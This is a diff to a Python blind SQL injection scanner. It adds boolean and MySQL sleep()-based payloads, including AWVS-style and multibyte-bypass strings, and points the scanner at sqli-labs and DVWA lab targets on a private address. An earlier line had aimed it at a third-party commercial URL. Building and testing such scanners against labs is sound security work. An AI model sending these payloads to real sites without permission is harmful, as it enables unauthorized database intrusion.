@@ -58,7 +58,7 @@ class SQLInjectionTime(object):
         self.longDuration = 6
 
         logger.info('URL: {}'.format(self.url))
-        logger.info('OrigValue: {}'.format(self.orivalue))
+        logger.info('OrigValue: {}'.format(repr(self.orivalue)))
 
 
 
@@ -217,11 +217,11 @@ class SQLInjectionTime(object):
             equalitySign = '!='
 
         # 先不管数字型的，只看字符
-        payload1 = likeStr + quoteChar + " AND 2*3*8=6*8 AND " + quoteChar + randStr + quoteChar + equalitySign + quoteChar + randStr + likeStr
+        payload1 = likeStr + quoteChar + " AND 2*3*8=6*8 AND " + '\'' + randStr + '\'' + equalitySign + '\'' + randStr + '\'-- ' + likeStr
         # 生成payload
-        logger.info("payload1= {}".format(payload1))
+        logger.info("payload1= {}".format(repr(payload1)))
         paramValue = self.get_request_payload(origValue, varIndex, payload1)
-        logger.debug("paramValue= {}".format(paramValue))
+        logger.debug("paramValue= {}".format(repr(paramValue)))
         # 如果正确，这里只有一个值
         self.hj.request_param_dict = paramValue
         status_code, headers, html, time_used = self.hj.request()
@@ -235,7 +235,7 @@ class SQLInjectionTime(object):
         # add to confirmInjectionHistory
 
         # 测试假值
-        payload2 = likeStr + quoteChar + " AND 2*3*8=6*9 AND " + quoteChar + randStr + quoteChar + equalitySign + quoteChar + randStr + likeStr
+        payload2 = likeStr + quoteChar + " AND 2*3*8=6*9 AND " + '\'' + randStr + '\'' + equalitySign + '\'' + randStr + '\'--' +  likeStr
         logger.info("payload2= {}".format(payload2))
         paramValue = self.get_request_payload(origValue, varIndex, payload2)
 
@@ -251,7 +251,7 @@ class SQLInjectionTime(object):
 
         # add to confirmInjectionHistory
         # 再测一个假值
-        payload3 = likeStr + quoteChar + " AND 3*3<(2*4) AND " + quoteChar + randStr + quoteChar + equalitySign + quoteChar + randStr + likeStr
+        payload3 = likeStr + quoteChar + " AND 3*3<(2*4) AND " + '\'' + randStr + '\'' + equalitySign + '\'' + randStr + '\'-- ' +  likeStr
         logger.info("payload3= {}".format(payload3))
         paramValue = self.get_request_payload(origValue, varIndex, payload3)
         logger.debug("paramValue= {}".format(paramValue))
@@ -266,7 +266,7 @@ class SQLInjectionTime(object):
             return False
 
         # add to confirmInjectionHistory
-        payload4 = likeStr + quoteChar + " AND 3*2>(1*5) AND " + quoteChar + randStr + quoteChar + equalitySign + quoteChar + randStr + likeStr
+        payload4 = likeStr + quoteChar + " AND 3*2>(1*5) AND " + '\'' + randStr + '\'' + equalitySign + '\'' + randStr + '\'-- ' + likeStr
         logger.info("payload4= {}".format(payload4))
         paramValue = self.get_request_payload(origValue, varIndex, payload4)
 
@@ -282,7 +282,7 @@ class SQLInjectionTime(object):
         # and to conrimInjecitionHistory
 
         # 测试真值
-        payload5 = likeStr + quoteChar + " AND 3*2*0>=0 AND " + quoteChar + randStr + quoteChar + equalitySign + quoteChar + randStr + likeStr
+        payload5 = likeStr + quoteChar + " AND 3*2*0>=0 AND " + '\'' + randStr + '\'' + equalitySign + '\'' + randStr + '\'-- ' +  likeStr
         logger.info("payload5= {}".format(payload5))
         paramValue = self.get_request_payload(origValue, varIndex, payload5)
 
@@ -298,7 +298,7 @@ class SQLInjectionTime(object):
         # and to conrimInjecitionHistory
 
         # 然后再测假值
-        payload6 = likeStr + quoteChar + " AND 3*3*9<(2*4) AND " + quoteChar + randStr + quoteChar + equalitySign + quoteChar + randStr + likeStr
+        payload6 = likeStr + quoteChar + " AND 3*3*9<(2*4) AND " + '\'' + randStr + '\'' + equalitySign + '\'' + randStr + '\'-- ' + likeStr
         logger.info("payload6= {}".format(payload6))
         paramValue = self.get_request_payload(origValue, varIndex, payload6)
 
@@ -316,7 +316,7 @@ class SQLInjectionTime(object):
 
         # do some common test
         # common test 真值
-        payload7 = likeStr + quoteChar + " AND 5*4=20 AND " + quoteChar + randStr + quoteChar + equalitySign + quoteChar + randStr + likeStr
+        payload7 = likeStr + quoteChar + " AND 5*4=20 AND " + '\'' + randStr + '\'' + equalitySign + '\'' + randStr + '\'-- ' +  likeStr
         logger.info("payload7= {}".format(payload7))
         paramValue = self.get_request_payload(origValue, varIndex, payload7)
 
@@ -332,7 +332,7 @@ class SQLInjectionTime(object):
         # add to confirmInjectionHistory
 
         # common test 假值
-        payload8 = likeStr + quoteChar + " AND 5*4=21 AND " + quoteChar + randStr + quoteChar + equalitySign + quoteChar + randStr + likeStr
+        payload8 = likeStr + quoteChar + " AND 5*4=21 AND " + '\'' + randStr + '\'' + equalitySign + '\'' + randStr + '\'-- ' +  likeStr
         logger.info("payload8= {}".format(payload8))
         paramValue = self.get_request_payload(origValue, varIndex, payload8)
 
@@ -348,7 +348,7 @@ class SQLInjectionTime(object):
         # and to conrimInjecitionHistory
 
         # 假值
-        payload9 = likeStr + quoteChar + " AND 5*6<26 AND " + quoteChar + randStr + quoteChar + equalitySign + quoteChar + randStr + likeStr
+        payload9 = likeStr + quoteChar + " AND 5*6<26 AND " + '\'' + randStr + '\'' + equalitySign + '\'' + randStr + '\'-- ' + likeStr
         logger.info("payload9= {}".format(payload9))
         paramValue = self.get_request_payload(origValue, varIndex, payload9)
 
@@ -364,7 +364,7 @@ class SQLInjectionTime(object):
         # and to conrimInjecitionHistory
 
         # 真值
-        payload10 = likeStr + quoteChar + " AND 7*7>48 AND " + quoteChar + randStr + quoteChar + equalitySign + quoteChar + randStr + likeStr
+        payload10 = likeStr + quoteChar + " AND 7*7>48 AND " + '\'' + randStr + '\'' + equalitySign + '\'' + randStr + '\'-- ' + likeStr
         logger.info("payload10= {}".format(payload10))
         paramValue = self.get_request_payload(origValue, varIndex, payload10)
 
@@ -379,7 +379,7 @@ class SQLInjectionTime(object):
             return False
 
         # 假值
-        payload11 = likeStr + quoteChar + " AND 3*2*0=6 AND " + quoteChar + randStr + quoteChar + equalitySign + quoteChar + randStr + likeStr
+        payload11 = likeStr + quoteChar + " AND 3*2*0=6 AND " + '\'' + randStr + '\'' + equalitySign + '\'' + randStr + '\'-- ' +  likeStr
         logger.info("payload11= {}".format(payload11))
         paramValue = self.get_request_payload(origValue, varIndex, payload11)
 
@@ -395,7 +395,7 @@ class SQLInjectionTime(object):
         # and to conrimInjecitionHistory
 
         # 真值
-        payload12 = likeStr + quoteChar + " AND 3*2*1=6 AND " + quoteChar + randStr + quoteChar + equalitySign + quoteChar + randStr + likeStr
+        payload12 = likeStr + quoteChar + " AND 3*2*1=6 AND " + '\'' + randStr + '\'' + equalitySign + '\'' + randStr + '\'-- ' +likeStr
         logger.info("payload12= {}".format(payload12))
         paramValue = self.get_request_payload(origValue, varIndex, payload12)
 
@@ -430,7 +430,7 @@ class SQLInjectionTime(object):
         # logger.info("temQueryDict={}".format(repr(tmpQueryDict)))
         # logger.info("tmpOrigValue={}".format(repr(tmpOrigValue)))
         tmpQueryStr = urllib.urlencode(tmpQueryDict)
-        payload1 = Pollution(tmpQueryStr, payload).payload_generate()
+        payload1 = Pollution(tmpQueryStr, payload, replace=False).payload_generate()
         # logger.info("payload1={}".format(repr(payload1)))
         # print payload1[0]
         # print tmpOrigValue
@@ -473,7 +473,7 @@ class SQLInjectionTime(object):
             payload1 = payload1[:-4]
 
         paramValue = self.get_request_payload(origValue, varIndex, payload1)
-        logger.debug("paramValue1= {}".format(paramValue))
+        logger.debug("paramValue1= {}".format(repr(paramValue)))
         # 如果正确，这里只有一个值
         self.hj.request_param_dict = paramValue
         status_code, headers, html, time_used = self.hj.request()
@@ -494,7 +494,7 @@ class SQLInjectionTime(object):
             payload1 = payload2[:-4]
 
         paramValue = self.get_request_payload(origValue, varIndex, payload2)
-        logger.debug("paramValue= {}".format(paramValue))
+        logger.debug("paramValue= {}".format(repr(paramValue)))
         # 如果正确，这里只有一个值
         self.hj.request_param_dict = paramValue
         status_code, headers, html, time_used = self.hj.request()
@@ -512,7 +512,8 @@ class SQLInjectionTime(object):
             payload1 = payload3[:-4]
 
         paramValue = self.get_request_payload(origValue, varIndex, payload3)
-        logger.debug("paramValue= {}".format(paramValue))
+        #logger.debug("paramValue= {}".format(paramValue))
+        logger.debug("paramValue= {}".format(repr(paramValue)))
         # 如果正确，这里只有一个值
         self.hj.request_param_dict = paramValue
         status_code, headers, html, time_used = self.hj.request()
@@ -529,7 +530,8 @@ class SQLInjectionTime(object):
             payload1 = payload4[:-4]
 
         paramValue = self.get_request_payload(origValue, varIndex, payload4)
-        logger.debug("paramValue= {}".format(paramValue))
+        #logger.debug("paramValue= {}".format(paramValue))
+        logger.debug("paramValue= {}".format(repr(paramValue)))
         # 如果正确，这里只有一个值
         self.hj.request_param_dict = paramValue
         status_code, headers, html, time_used = self.hj.request()
@@ -546,7 +548,8 @@ class SQLInjectionTime(object):
             payload1 = payload5[:-4]
 
         paramValue = self.get_request_payload(origValue, varIndex, payload5)
-        logger.debug("paramValue= {}".format(paramValue))
+        #logger.debug("paramValue= {}".format(paramValue))
+        logger.debug("paramValue= {}".format(repr(paramValue)))
         # 如果正确，这里只有一个值
         self.hj.request_param_dict = paramValue
         status_code, headers, html, time_used = self.hj.request()
@@ -564,7 +567,8 @@ class SQLInjectionTime(object):
             payload1 = payload6[:-4]
 
         paramValue = self.get_request_payload(origValue, varIndex, payload6)
-        logger.debug("paramValue= {}".format(paramValue))
+        #logger.debug("paramValue= {}".format(paramValue))
+        logger.debug("paramValue= {}".format(repr(paramValue)))
         # 如果正确，这里只有一个值
         self.hj.request_param_dict = paramValue
         status_code, headers, html, time_used = self.hj.request()
@@ -581,7 +585,8 @@ class SQLInjectionTime(object):
             payload1 = payload7[:-4]
 
         paramValue = self.get_request_payload(origValue, varIndex, payload7)
-        logger.debug("paramValue= {}".format(paramValue))
+        #logger.debug("paramValue= {}".format(paramValue))
+        logger.debug("paramValue= {}".format(repr(paramValue)))
         # 如果正确，这里只有一个值
         self.hj.request_param_dict = paramValue
         status_code, headers, html, time_used = self.hj.request()
@@ -598,7 +603,8 @@ class SQLInjectionTime(object):
             payload1 = payload8[:-4]
 
         paramValue = self.get_request_payload(origValue, varIndex, payload8)
-        logger.debug("paramValue= {}".format(paramValue))
+        #logger.debug("paramValue= {}".format(paramValue))
+        logger.debug("paramValue= {}".format(repr(paramValue)))
         # 如果正确，这里只有一个值
         self.hj.request_param_dict = paramValue
         status_code, headers, html, time_used = self.hj.request()
@@ -615,7 +621,8 @@ class SQLInjectionTime(object):
             payload1 = payload9[:-4]
 
         paramValue = self.get_request_payload(origValue, varIndex, payload9)
-        logger.debug("paramValue= {}".format(paramValue))
+        #logger.debug("paramValue= {}".format(paramValue))
+        logger.debug("paramValue= {}".format(repr(paramValue)))
         # 如果正确，这里只有一个值
         self.hj.request_param_dict = paramValue
         status_code, headers, html, time_used = self.hj.request()
@@ -632,7 +639,8 @@ class SQLInjectionTime(object):
             payload1 = payload10[:-4]
 
         paramValue = self.get_request_payload(origValue, varIndex, payload10)
-        logger.debug("paramValue= {}".format(paramValue))
+        #logger.debug("paramValue= {}".format(paramValue))
+        logger.debug("paramValue= {}".format(repr(paramValue)))
         # 如果正确，这里只有一个值
         self.hj.request_param_dict = paramValue
         status_code, headers, html, time_used = self.hj.request()
@@ -658,14 +666,18 @@ class SQLInjectionTime(object):
         elif sleepType  == 'none':
             return "0"
 
-    def testTiming(self, varIndex, paramValue, dontEncode, benchmark=False):
+    def testTiming(self, varIndex, paramValue, dontEncode, benchmark=False, replace=False):
         # origParamValue = paramValue
         timeOrigValueDict = self.orivalue.copy()
         tmp_origvalue = timeOrigValueDict[self.variations[varIndex]]
-        timeOrigValueDict[self.variations[varIndex]] += paramValue
+        if replace:
+            timeOrigValueDict[self.variations[varIndex]] = paramValue
+        else:
+
+            timeOrigValueDict[self.variations[varIndex]] += paramValue
         origParamValue = urllib.unquote(urllib.urlencode(timeOrigValueDict))
 
-        logger.info(Fore.RED + "origParamValue= {}".format(origParamValue) + Style.RESET_ALL)
+        logger.info(Fore.RED + "origParamValue= {}".format(repr(origParamValue)) + Style.RESET_ALL)
         confirmed = False
         # 生成四个时间变量
         time1 = 0 # long  4
@@ -688,9 +700,10 @@ class SQLInjectionTime(object):
             paramValue = paramValue.replace('{ORIGVALUE}', tmp_origvalue)
             paramValue = paramValue.replace('{RANDSTR}', random_str())
             # 这里paramValue应该是a=b&c=d这种形式的，
+            #paramValue = urllib.urlencode(paramValue)
             paramValue_dict = Url.qs_parse(paramValue)
 
-            print ""
+            #print ""
             self.hj.request_param_dict = paramValue_dict
             status_code, headers, html, time_used = self.hj.request()
             logger.info("time_usd={} & sleep={}".format(time_used, self.genSleepString('long')))
@@ -710,6 +723,7 @@ class SQLInjectionTime(object):
             paramValue = paramValue.replace('{ORIGVALUE}', tmp_origvalue)
             paramValue = paramValue.replace('{RANDSTR}', random_str())
             # 这里paramValue应该是a=b&c=d这种形式的，
+            #paramValue = urllib.urlencode(paramValue)
             paramValue_dict = Url.qs_parse(paramValue)
 
             self.hj.request_param_dict = paramValue_dict
@@ -732,6 +746,7 @@ class SQLInjectionTime(object):
             paramValue = paramValue.replace('{ORIGVALUE}', tmp_origvalue)
             paramValue = paramValue.replace('{RANDSTR}', random_str())
             # 这里paramValue应该是a=b&c=d这种形式的，
+            #paramValue = urllib.urlencode(paramValue)
             paramValue_dict = Url.qs_parse(paramValue)
 
             self.hj.request_param_dict = paramValue_dict
@@ -755,6 +770,8 @@ class SQLInjectionTime(object):
             paramValue = paramValue.replace('{ORIGVALUE}', tmp_origvalue)
             paramValue = paramValue.replace('{RANDSTR}', random_str())
             # 这里paramValue应该是a=b&c=d这种形式的，
+            #paramValue = urllib.urlencode(paramValue).replace('%20', '+')
+            #paramValue = urllib.urlencode(paramValue)
             paramValue_dict = Url.qs_parse(paramValue)
 
             self.hj.request_param_dict = paramValue_dict
@@ -810,34 +827,43 @@ class SQLInjectionTime(object):
 
 
     def testTimingStartPoint(self, varIndex):
-        prefix = ['', '\'', '"', '\')', '")']
+        prefix = [('', ''), ('\'', '\''), ('"', '""'), ('\')', '\'('), ('")', '"('), ]
         for quoteChar in prefix:
-            payload = quoteChar + " or if(now()=sysdate(),sleep({SLEEP}),0)/*'XOR(if(now()=sysdate(),sleep({SLEEP}),0))OR'\"XOR(if(now()=sysdate(),sleep({SLEEP}),0))OR\"*/" + " or " + quoteChar
-            logger.info(Fore.RED + "pyaload={}".format(payload) + Style.RESET_ALL)
+            payload = quoteChar[0] + " or if(now()=sysdate(),sleep({SLEEP}),0)/*'XOR(if(now()=sysdate(),sleep({SLEEP}),0))OR'\"XOR(if(now()=sysdate(),sleep({SLEEP}),0))OR\"*/" + " or " + quoteChar[1]
+            logger.info(Fore.RED + u"pyaload={}".format(repr(payload)) + Style.RESET_ALL)
             time_result = self.testTiming(varIndex, payload, True, benchmark=False)
             if time_result:
                 logger.info(Fore.RED + "Found Time Injection At URL={}".format(self.url) + Style.RESET_ALL)
                 return True
         # send payload
         for quoteChar in prefix:
-            payload = quoteChar + " or (select(0)from(select(sleep({SLEEP})))v)/*'+(select(0)from(select(sleep({SLEEP})))v)+'\"+(select(0)from(select(sleep({SLEEP})))v)+\"*/" + " or " + quoteChar
+            payload = quoteChar[0] + " or (select(0)from(select(sleep({SLEEP})))v)/*'%2b(select(0)from(select(sleep({SLEEP})))v)%2b0'\"%2b(select(0)from(select(sleep({SLEEP})))v)+\"*/" + " or " + quoteChar[1]
+            print repr(payload)
+            print "------------------------"
             time_result = self.testTiming(varIndex, payload, True, benchmark=False)
             if time_result:
+       # logger.debug("paramValue= {}".format(repr(paramValue)))
                 logger.info(Fore.RED + "Found Time Injection At URL={}".format(self.url) + Style.RESET_ALL)
                 return True
         # awvs original payload like this
         payload = "if(now()=sysdate(),sleep({SLEEP}),0)/*'XOR(if(now()=sysdate(),sleep({SLEEP}),0))OR'\"XOR(if(now()=sysdate(),sleep({SLEEP}),0))OR\"*/"
 
-        time_result = self.testTiming(varIndex, payload, True, benchmark=False)
+        time_result = self.testTiming(varIndex, payload, True, benchmark=False, replace=True)
         if time_result:
             logger.info(Fore.RED + "Found Time Injection At URL={}".format(self.url) + Style.RESET_ALL)
             return True
 
-        payload2 = "(select(0)from(select(sleep({SLEEP})))v)/*'+(select(0)from(select(sleep({SLEEP})))v)+'\"+(select(0)from(select(sleep({SLEEP})))v)+\"*/"
-        time_result = self.testTiming(varIndex, payload2, True, benchmark=False)
+        payload2 = "(select(0)from(select(sleep({SLEEP})))v)/*'%2b(select(0)from(select(sleep({SLEEP})))v)%2b'\"%2b(select(0)from(select(sleep({SLEEP})))v)%2b\"*/"
+        time_result = self.testTiming(varIndex, payload2, True, benchmark=False, replace=True)
         if time_result:
             logger.info(Fore.RED + "Found Time Injection At URL={}".format(self.url) + Style.RESET_ALL)
             return True
+        payload3 = '\xdf\'AND (SELECT * FROM (SELECT(SLEEP({SLEEP})))zpGO)-- -'
+        time_result = self.testTiming(varIndex, payload3, True, benchmark=False, replace=True)
+        if time_result:
+            logger.info(Fore.RED + "Found Time Injection At URL={}".format(self.url) + Style.RESET_ALL)
+            return True
+
 
         return False
         # benchmark loser
@@ -867,10 +893,10 @@ class SQLInjectionTime(object):
                 else:
                     logger.info("[startTest] Response Is Not Stable")
 
-                r = self.testTimingStartPoint(varIndex)
-                if r:
-                    # here shoud be return a format result
-                    return True
+                #r = self.testTimingStartPoint(varIndex)
+                #if r:
+                #    # here shoud be return a format result
+                #    return True
 
                 r = self.testBoolStartPoint(varIndex)
                 if r:
@@ -883,15 +909,86 @@ class SQLInjectionTime(object):
 
 def main():
     headers = {
-        "Cookie": 'security=low; PHPSESSID=qn7uogv579nbifqopr1hf53k36',
+        #"Cookie": 'security=low; PHPSESSID=qn7uogv579nbifqopr1hf53k36',
         'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36',
         'Referer': 'http://10.127.21.237/dvwa/vulnerabilities/sqli_blind/'
     }
-    url = 'http://img12.360buyimg.com/n2/jfs/t3229/314/6863934982/144141/86bc1245/58aeb140Nde581af9.jpg!q90'
-    a = SQLInjectionTime(url, headers)
-    r = a.startTest()
-    if r:
-        print "o fuck"
+   # url = 'http://10.127.21.237/sqli-labs/Less-1/?id=1'
+    #url = 'http://10.127.21.237/sqli-labs/Less-2/?id=1'
+    #url = 'http://10.127.21.237/sqli-labs/Less-3/?id=1'
+    #url = 'http://10.127.21.237/sqli-labs/Less-4/?id=1'
+    #url = 'http://10.127.21.237/sqli-labs/Less-5/?id=1'
+    #url = 'http://10.127.21.237/sqli-labs/Less-6/?id=1'
+    #url = 'http://10.127.21.237/sqli-labs/Less-7/?id=1'
+    #url = 'http://10.127.21.237/sqli-labs/Less-8/?id=1'
+    #url = 'http://10.127.21.237/sqli-labs/Less-9/?id=1'
+    #url = 'http://10.127.21.237/sqli-labs/Less-10/?id=1'
+    #a = SQLInjectionTime(url, headers)
+    #r = a.startTest()
+    #if r:
+    #    print "o fuck"
+
+    #url = 'http://10.127.21.237/sqli-labs/Less-11/'
+    #url = 'http://10.127.21.237/sqli-labs/Less-17/'
+    '''
+    less 17 update can not detect, sqlmap default/awvs also;
+    less 18 header was not detect,
+    less 19-22 can not detect , header,cookie, xff and so on
+
+
+    less 28a bool failed
+    '''
+    #url = 'http://10.127.21.237/sqli-labs/Less-21/'
+    #data = 'uname=a&passwd=b&submit=Submit'
+    data=None
+    #url = 'http://10.127.21.237/sqli-labs/Less-23/?id=1'
+    #url = 'http://10.127.21.237/sqli-labs/Less-25/?id=1'
+    url = 'http://10.127.21.237/sqli-labs/Less-25a/?id=1'
+    url_list = ['http://10.127.21.237/sqli-labs/Less-26/?id=1',]
+    url_list += ['http://10.127.21.237/sqli-labs/Less-1/?id=1',]
+    url_list += ['http://10.127.21.237/sqli-labs/Less-2/?id=1',]
+    url_list += ['http://10.127.21.237/sqli-labs/Less-3/?id=1',]
+    #url_list += ['http://10.127.21.237/sqli-labs/Less-26a/?id=1',]
+    #url_list += ['http://10.127.21.237/sqli-labs/Less-27/?id=1',]
+    #url_list += ['http://10.127.21.237/sqli-labs/Less-27a/?id=1',]
+    url_list += ['http://10.127.21.237/sqli-labs/Less-28/?id=1',]
+    url_list += ['http://10.127.21.237/sqli-labs/Less-28a/?id=1',]
+    url_list += ['http://10.127.21.237/sqli-labs/Less-29/?id=1',]
+    url_list += ['http://10.127.21.237/sqli-labs/Less-30/?id=1',]
+    url_list += ['http://10.127.21.237/sqli-labs/Less-31/?id=1',]
+    url_list += ['http://10.127.21.237/sqli-labs/Less-32/?id=1',]
+    url_list += ['http://10.127.21.237/sqli-labs/Less-33/?id=1',]
+    url_list += ['http://10.127.21.237/sqli-labs/Less-35/?id=1',]
+    #url_list += ['http://10.127.21.237/sqli-labs/Less-36/?id=1',]
+    #url_list += ['http://10.127.21.237/sqli-labs/Less-38/?id=1',]
+    #url_list += ['http://10.127.21.237/sqli-labs/Less-39/?id=1',]
+    #url_list += ['http://10.127.21.237/sqli-labs/Less-40/?id=1',]
+    #url_list += ['http://10.127.21.237/sqli-labs/Less-41/?id=1',]
+    '''
+    url_list += ['http://10.127.21.237/sqli-labs/Less-46/?sort=1',]
+    url_list += ['http://10.127.21.237/sqli-labs/Less-47/?sort=1',]
+    url_list += ['http://10.127.21.237/sqli-labs/Less-48/?sort=1',]
+    url_list += ['http://10.127.21.237/sqli-labs/Less-49/?sort=1',]
+    url_list += ['http://10.127.21.237/sqli-labs/Less-50/?sort=1',]
+    url_list += ['http://10.127.21.237/sqli-labs/Less-51/?sort=1',]
+    url_list += ['http://10.127.21.237/sqli-labs/Less-52/?sort=1',]
+    url_list += ['http://10.127.21.237/sqli-labs/Less-53/?sort=1',]
+    '''
+
+    result = []
+    for url in url_list:
+        a = SQLInjectionTime(url, headers, data=data)
+        r = a.startTest()
+        if r:
+            print 'o fuck post'
+            result.append("URL={} &Reuslt={}".format(url, True))
+        else:
+            result.append('URL={} & Result={}'.format(url, False))
+
+    for i in result:
+        print i
+
+
     # for i in a.variations:
     #     print i
     #     if a.checkIfResponseIsStable(i):
